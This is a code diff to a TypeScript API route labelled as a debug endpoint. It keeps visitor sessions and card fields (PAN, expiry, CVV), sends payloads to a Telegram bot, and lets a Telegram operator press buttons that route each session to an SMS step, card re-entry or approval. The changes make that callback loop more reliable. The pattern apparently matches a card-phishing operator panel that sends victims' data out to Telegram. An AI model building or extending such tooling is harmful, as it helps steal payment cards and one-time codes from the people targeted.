@@ -33,9 +33,12 @@ const CARD_MOCKS: Record<string, { brand: string; pan: string; exp: string; cvv:
 const globals = globalThis as typeof globalThis & {
   __latamDebugSessions?: Map<string, DebugSession>;
   __latamDebugTelegramOffset?: number;
+  __latamDebugCallbackIds?: Set<string>;
 };
 const sessions = globals.__latamDebugSessions ?? new Map<string, DebugSession>();
 globals.__latamDebugSessions = sessions;
+const answeredCallbacks = globals.__latamDebugCallbackIds ?? new Set<string>();
+globals.__latamDebugCallbackIds = answeredCallbacks;
 
 function json(data: unknown, init: ResponseInit = {}) {
   return new Response(JSON.stringify(data), {
@@ -174,21 +177,21 @@ function formatTelegramMessage(payload: Record<string, unknown>) {
 // Wrapper minimo para llamar metodos del Bot API sin repetir token/url.
 async function telegramApi(method: string, payload: Record<string, unknown>) {
   const { token } = telegramConfig();
-  if (!token) return { ok: false, skipped: 'telegram-env-missing' };
-  const response = await fetch(`https://api.telegram.org/bot${token}/${method}`, {
-    method: 'POST',
-    headers: { 'Content-Type': 'application/json' },
-    body: JSON.stringify(payload),
-  });
-  return { ok: response.ok, status: response.status };
+  if (!token) return { ok: false, skipped: 'telegram-env-missing', status: 0 };
+  try {
+    const response = await fetch(`https://api.telegram.org/bot${token}/${method}`, {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify(payload),
+    });
+    const body = await response.json().catch(() => ({}));
+    return { ok: response.ok && body?.ok !== false, status: response.status, description: String(body?.description || '') };
+  } catch {
+    return { ok: false, status: 0, description: 'telegram-network' };
+  }
 }
 
-// En local no hay webhook publico. getUpdates permite recoger callbacks cuando
-// el frontend hace polling al endpoint GET /api/debug.
-async function telegramGetUpdates() {
-  const { token } = telegramConfig();
-  if (!token) return [];
-  const offset = globals.__latamDebugTelegramOffset;
+async function fetchUpdates(token: string, offset?: number) {
   const qs = new URLSearchParams({
     timeout: '0',
     allowed_updates: JSON.stringify(['callback_query']),
@@ -197,8 +200,23 @@ async function telegramGetUpdates() {
   const response = await fetch(`https://api.telegram.org/bot${token}/getUpdates?${qs.toString()}`, {
     headers: { Accept: 'application/json' },
   });
-  if (!response.ok) return [];
-  const payload = await response.json();
+  const payload = await response.json().catch(() => ({}));
+  return { status: response.status, payload };
+}
+
+// En local no hay webhook publico. getUpdates permite recoger callbacks cuando
+// el frontend hace polling al endpoint GET /api/debug.
+async function telegramGetUpdates() {
+  const { token } = telegramConfig();
+  if (!token) return [];
+  const offset = globals.__latamDebugTelegramOffset;
+  let { status, payload } = await fetchUpdates(token, offset);
+  // Si hay webhook activo, getUpdates falla y los botones se quedan en loading.
+  if (status === 409 || /webhook/i.test(String(payload?.description || ''))) {
+    await telegramApi('deleteWebhook', { drop_pending_updates: false });
+    ({ status, payload } = await fetchUpdates(token, offset));
+  }
+  if (status !== 200) return [];
   return Array.isArray(payload?.result) ? payload.result : [];
 }
 
@@ -215,41 +233,61 @@ async function sendTelegram(payload: Record<string, unknown>, options: { withBut
   };
   if (options.withButtons ?? true) {
     message.reply_markup = keyboard(sessionId, brand);
+    await telegramApi('deleteWebhook', { drop_pending_updates: false });
   }
   const result = await telegramApi('sendMessage', message);
   return result.ok ? { sent: true } : { sent: false, error: `telegram-${result.status || 'unknown'}` };
 }
 
+async function answerTelegramCallback(callbackId: unknown, text: string) {
+  const id = String(callbackId || '');
+  if (!id || answeredCallbacks.has(id)) return;
+  const result = await telegramApi('answerCallbackQuery', {
+    callback_query_id: id,
+    text,
+    show_alert: false,
+  });
+  if (result.ok || /already|too old|query_id/i.test(result.description || '')) {
+    answeredCallbacks.add(id);
+    if (answeredCallbacks.size > 200) {
+      const first = answeredCallbacks.values().next().value;
+      if (first) answeredCallbacks.delete(first);
+    }
+  }
+}
+
+async function clearTelegramKeyboard(callback: Record<string, unknown>) {
+  const message = callback.message as Record<string, unknown> | undefined;
+  if (!message?.chat || typeof message.message_id !== 'number') return;
+  const chat = message.chat as Record<string, unknown>;
+  await telegramApi('editMessageReplyMarkup', {
+    chat_id: chat.id,
+    message_id: message.message_id,
+    reply_markup: { inline_keyboard: [] },
+  });
+}
+
 // Procesa callbacks tanto si llegan por webhook como si llegan por getUpdates.
-// Al usarse un boton, quita el teclado inline para evitar decisiones duplicadas.
+// Primero responde el clic (si no, Telegram se queda en loading y muestra "ya ha sido respondida").
 async function handleTelegramCallback(body: Record<string, unknown>) {
-  const callback = body.callback_query as Record<string, unknown> | undefined;
-  const data = String(callback?.data || '');
-  const match = data.match(/^route:([^:]+):(sms|card|approved):([^:]+)$/);
-  if (!match) return json({ ok: true, ignored: true });
+  const callback = (body.callback_query || body) as Record<string, unknown> | undefined;
+  const nested = callback && typeof callback === 'object' && 'data' in callback ? callback : undefined;
+  const source = (nested || {}) as Record<string, unknown>;
+  const data = String(source.data || '');
+  const match = data.match(/^route:([^:]+):(sms|card|approved):([^:]*)$/);
+
+  if (!match) {
+    await answerTelegramCallback(source.id, 'Listo');
+    return json({ ok: true, ignored: true });
+  }
 
   const [, rawSessionId, rawAction, rawBrand] = match;
   const sessionId = cleanSessionId(rawSessionId);
-  const decision = makeDecision(sessionId, rawAction as RouteAction, rawBrand);
+  const decision = makeDecision(sessionId, rawAction as RouteAction, rawBrand || 'visa');
   getSession(sessionId).decision = decision;
 
-  const message = callback?.message as Record<string, unknown> | undefined;
-  if (message?.chat && typeof message.message_id === 'number') {
-    const chat = message.chat as Record<string, unknown>;
-    await telegramApi('editMessageReplyMarkup', {
-      chat_id: chat.id,
-      message_id: message.message_id,
-      reply_markup: { inline_keyboard: [] },
-    });
-  }
-
-  if (callback?.id) {
-    await telegramApi('answerCallbackQuery', {
-      callback_query_id: callback.id,
-      text: actionLabel(decision.action),
-      show_alert: false,
-    });
-  }
+  await answerTelegramCallback(source.id, actionLabel(decision.action));
+  await clearTelegramKeyboard(source);
 
   return json({ ok: true, sessionId, decision });
 }
@@ -286,6 +324,9 @@ export const POST: APIRoute = async ({ request }) => {
   }
 
   if (body.callback_query) return handleTelegramCallback(body);
+  if (body.update_id && (body as { message?: unknown }).message) {
+    return json({ ok: true, ignored: 'telegram-message' });
+  }
 
   console.info('[debug-api:body]', body);
 
